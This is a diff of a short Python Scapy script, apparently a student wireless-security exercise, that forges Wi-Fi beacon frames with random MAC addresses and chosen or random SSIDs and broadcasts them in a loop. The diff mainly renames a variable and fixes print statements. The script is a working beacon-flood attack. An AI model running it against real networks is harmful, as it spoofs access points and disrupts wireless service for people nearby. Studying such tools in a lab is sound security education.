@@ -1,3 +1,5 @@
+#Auteurs : Peguiron Adrien, Viotti Nicolas
+
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
 #
@@ -5,10 +7,10 @@
 #
 # requires:
 #     radiotap supported wifi nic/driver (frame injection) (works fine with Ralink RT2571W)
-#     iwconfig $iface mode monitor
-#     iw dev $iface set channel $channel
+#     iwconfig $IFACE mode monitor
+#     iw dev $IFACE set channel $channel
 #       or
-#     iwlist iface scan
+#     iwlist IFACE scan
 #
 # example:
 #    spawn 1000 essids (0-999)
@@ -25,7 +27,7 @@ seed(1)
 
 def main():
     ssids = []
-    iface = "wlan0"
+    IFACE = "wlan0"
     frames = []
     filename = input("Entrez le chemin absolu du fichier contenant les noms de SSID ou n'entrez rien pour créer des noms aléatoires\n")
 
@@ -41,8 +43,7 @@ def main():
             ssids.append(line)
 
     for netSSID in ssids:
-        print
-        netSSID
+        print(netSSID)
         dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                       addr2=str(RandMAC()), addr3=str(RandMAC()))
         beacon = Dot11Beacon(cap='ESS+privacy')
@@ -58,10 +59,9 @@ def main():
             '\x00\x00'))  # RSN Capabilities (no extra capabilities)
 
         frame = RadioTap() / dot11 / beacon / essid / rsn
-        print
-        "SSID=%-20s   %r" % (netSSID, frame)
+        print("SSID=%-20s   %r" % (netSSID, frame))
         frames.append(frame)
-    sendp(frames, iface=iface, inter=0.0100 if len(frames) < 10 else 0, loop=1)
+    sendp(frames, iface=IFACE, inter=0.0100 if len(frames) < 10 else 0, loop=1)
 
 
 if __name__ == "__main__":
